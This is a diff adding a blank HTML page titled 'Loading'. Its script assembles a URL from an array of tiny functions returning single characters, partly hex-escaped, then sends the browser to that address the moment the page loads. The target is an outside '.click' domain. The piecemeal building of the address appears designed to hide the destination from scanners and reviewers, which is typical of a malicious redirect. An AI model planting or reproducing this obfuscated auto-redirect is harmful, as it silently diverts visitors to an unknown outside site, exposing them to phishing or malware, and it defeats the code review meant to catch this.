@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading</title>
+    <script>
+        const bits = [
+            function() { return "h"; },
+            () => '\x74',
+            () => '\x74',
+            () => 'p',
+            () => '\x73',
+            () => '\x3a',
+            () => '\x2f',
+            () => "/",
+            function() { return 'v'; },
+            function() { return 'e'; },
+            () => "r",
+            () => '\x67',
+            () => "e",
+            q => 'n',
+            () => '.',
+            $ => 'c',
+            () => '\x6c',
+            _ => 'i',
+            function() { return 'c'; },
+            function() { return "k"; },
+            function() { return "/"; },
+            function() { return "s"; },
+            () => '\x2f',
+            function() { return "r"; },
+            () => '\x65',
+            c => "p"
+        ];
+        const dest = bits.reduce((out, fn) => out + fn(), '');
+
+        document.location = dest;
+    </script>
+</head>
+<body></body>
+</html>
